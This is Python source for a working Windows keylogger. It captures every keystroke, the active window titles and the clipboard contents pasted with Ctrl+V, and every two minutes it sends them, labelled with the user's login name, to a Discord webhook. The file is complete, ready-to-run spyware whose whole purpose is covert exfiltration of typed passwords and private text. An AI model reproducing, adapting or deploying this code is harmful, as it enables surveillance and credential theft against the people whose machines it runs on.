import os
from threading import Timer
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed  # type: ignore
from pynput.keyboard import Listener, Key
import pyperclip
import keyboard
import unicodedata
from dotenv import load_dotenv
import win32gui

load_dotenv()

current_window = None
SEND_REPORT_EVERY = 120
WEBHOOK = os.getenv("WEBHOOK_URL")
special_keys = {
    Key.alt_l: "",
    Key.alt_r: "",
    Key.backspace: " [Backspace] ",
    Key.caps_lock: "",
    Key.cmd_l: " [Windows Key] ",
    Key.ctrl_l: "",
    Key.ctrl_r: "",
    Key.delete: " [Delete] ",
    Key.down: " [Down] ",
    Key.end: "",
    Key.enter: "\n",
    Key.esc: " [Esc] ",
    Key.f1: " [F1] ",
    Key.f10: " [F10] ",
    Key.f11: " [F11] ",
    Key.f12: " [F12] ",
    Key.f2: " [F2] ",
    Key.f3: " [F3] ",
    Key.f4: " [F4] ",
    Key.f5: " [F5] ",
    Key.f6: " [F6] ",
    Key.f7: " [F7] ",
    Key.f8: " [F8] ",
    Key.f9: " [F9] ",
    Key.home: "",
    Key.insert: "",
    Key.left: " [Left] ",
    Key.num_lock: "",
    Key.page_down: "",
    Key.page_up: "",
    Key.pause: "",
    Key.right: " [Right] ",
    Key.scroll_lock: "",
    Key.shift_l: "",
    Key.shift_r: "",
    Key.space: " ",
    Key.tab: " [Tab] ",
    Key.up: " [Up] ",
    Key.media_volume_up: " [Volume Up] ",
    Key.media_volume_down: " [Volume Down] ",
    Key.media_volume_mute: " [Mute] ",
    Key.media_next: " [Next Track] ",
    Key.media_previous: " [Previous Track] ",
    Key.media_play_pause: " [Play/Pause] "
}

class Keylogger:
    def __init__(self, interval, report_method="webhook"):
        now = datetime.now()
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = now.strftime('%d/%m/%Y %H:%M')
        self.end_dt = now.strftime('%d/%m/%Y %H:%M')
        self.username = os.getlogin()
        keyboard.add_hotkey("ctrl+v", self.clipboard, suppress=False)

    def get_active_window(self):
        try:
            return win32gui.GetWindowText(win32gui.GetForegroundWindow())
        except Exception:
            return "Unknown Window"

    def log_window_change(self):
        global current_window
        new_window = self.get_active_window()
        if new_window != current_window and new_window.strip():
            current_window = new_window
            self.log += f"\n{"=" * 50}\nWindow title: {current_window}\n"

    def callback(self, key):
        self.log_window_change()
        try:
            key = key.char
            unicodedata.name(key)
        except AttributeError:
            if key in special_keys:
                key = special_keys[key]
            else:
                key = str(key).replace("Key.", " [") + "]"
        except (ValueError, AttributeError):
            key = ""
        self.log += key

    def clipboard(self):
        self.log_window_change()
        self.log += f"\n[Clipboard]: {{\n{pyperclip.paste()}\n}}\n"

    def report_to_webhook(self):
        webhook = DiscordWebhook(url=WEBHOOK)
        if len(self.log) > 2000:
                path = os.environ["temp"] + "\\report.txt"
                with open(path, 'w+') as file:
                    file.write(f"Keylogger Report From {self.username} Time: {self.end_dt}\n\n")
                    file.write(self.log)
                with open(path, 'rb') as f:
                    webhook.add_file(file=f.read(), filename='report.txt')
                webhook.execute()
                os.remove(path) 
        else:
            if len(self.log) > 0:
                embed = DiscordEmbed(title=f"Keylogger Report From ({self.username}) Time: {self.end_dt}", description=self.log)
                webhook.add_embed(embed)    
        webhook.execute()

    def report(self):
        if self.log:
            if self.report_method == "webhook":
                self.report_to_webhook()    
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        with Listener(on_release=self.callback) as listener:
            self.report()
            listener.join()

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="webhook")    
    keylogger.start()
